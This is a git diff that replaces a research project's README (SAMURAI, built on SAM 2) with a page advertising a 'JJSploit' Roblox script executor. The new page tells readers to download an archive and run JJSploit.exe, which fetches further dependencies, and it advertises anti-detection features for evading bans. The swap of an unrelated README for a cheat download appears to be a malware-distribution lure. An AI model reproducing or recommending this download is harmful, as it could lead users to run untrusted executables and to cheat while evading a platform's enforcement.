@@ -1,25 +1,54 @@
-## Getting Started
+# JJSploit Roblox Executor 2024
 
-#### SAMURAI Installation 
+> ### Roblox Script Executor ✨  
+> **Script Injection | Script Hub Integration | Custom APIs | User-Friendly UI**
 
-SAM 2 needs to be installed first before use. The code requires `python>=3.10`, as well as `torch>=2.3.1` and `torchvision>=0.18.1`. Please follow the instructions [here](https://github.com/facebookresearch/sam2?tab=readme-ov-file) to install both PyTorch and TorchVision dependencies. You can install **the SAMURAI version** of SAM 2 on a GPU machine using:
-```
-cd sam2
-pip install -e .
-pip install -e ".[notebooks]"
-```
+---
 
-Please see [INSTALL.md](https://github.com/facebookresearch/sam2/blob/main/INSTALL.md) from the original SAM 2 repository for FAQs on potential issues and solutions.
-```
-pip install matplotlib==3.7 tikzplotlib jpeg4py opencv-python lmdb pandas scipy
-```
+## 🛠️ Getting Started  
 
-#### SAM 2.1 Checkpoint Download
+### **Installation**  
 
-```
-cd checkpoints && \
-./download_ckpts.sh && \
-cd ..
-```
+1. **Download the archive from this repository and extract it to a folder of your choice.**  
+2. **Run `JJSploit.exe` to install the executor. It will automatically download all the necessary dependencies.**  
 
-#### Data Preparation
+---
+
+## 🔥 Features  
+
+- **High-Performance Script Injection**  
+  Execute custom scripts efficiently with minimal lag.
+
+- **Script Hub**  
+  Access a library of preloaded scripts for a variety of Roblox games.
+
+- **Custom API Support**  
+  Easily integrate third-party APIs to extend scripting capabilities.
+
+- **User-Friendly Interface**  
+  A clean, intuitive design perfect for both beginners and advanced users.
+
+---
+
+## 🛡️ Security  
+
+JJSploit includes advanced anti-detection features to help protect your account. However, keep in mind that Roblox may still issue bans for unauthorized activities. Use at your own risk.  
+
+---
+
+## 🤗 Contributing  
+
+We welcome contributions! Feel free to fork the repository and submit pull requests to improve the executor or add new features.  
+
+---
+
+## 📜 License  
+
+This project is licensed under the MIT License. For more information, see the LICENSE file.
+
+---
+
+## 🙏 Acknowledgments  
+
+- A big thank you to the JJSploit development team for creating a seamless and efficient executor experience.  
+- Special thanks to the scripting community for their creativity and ongoing contributions.  
